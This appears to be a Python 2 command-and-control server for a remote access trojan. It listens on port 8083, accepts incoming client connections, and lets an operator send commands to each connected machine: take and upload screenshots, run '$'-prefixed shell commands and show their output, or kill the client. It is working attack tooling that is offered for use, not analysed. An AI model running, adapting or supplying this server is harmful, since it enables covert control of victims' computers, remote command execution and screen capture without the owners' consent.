#!/usr/bin/env python
# coding=utf-8
## Author: s0nnet
## Mail: s0nnet@qq.com

import os
import socket
import threading
 
bind_ip = '0.0.0.0'
bind_port = 8083
 
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
server.bind((bind_ip, bind_port))
server.listen(5)
print '[+] Listening on %s:%d' % (bind_ip, bind_port)

# recv the client screenshot
def recvFile(client_socket):
    if os.path.isfile("recv.jpg"):
        os.remove("recv.jpg")
    f = open("recv.jpg","wb") 
    while(1):
        data = client_socket.recv(1024)
            
        #print len(data)

        if data[:3] == "EOF":
            print "[+] Recv file success!"
            break
        f.write(data)
    f.close()

# this is our client-handling thread
def handle_client(client_socket):

    # send back a packet
    while(1):

        try:
            cmd = raw_input(">>> ")
            client_socket.send(cmd)
            if cmd == "screenshot":
                recvFile(client_socket)
            elif cmd == "kill-client":
                data = client_socket.recv(1024)
                print "[-] %s" % data
            elif cmd[0] == "$":
                data = client_socket.recv(1024)
                print data.decode('gbk')
        except:
            print "Error!"


while True:
    client, addr = server.accept()
    print '[+] Accept connection from: %s:%d' % (addr[0], addr[1])
    
    # spin up our client thread to handle incoming data
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()
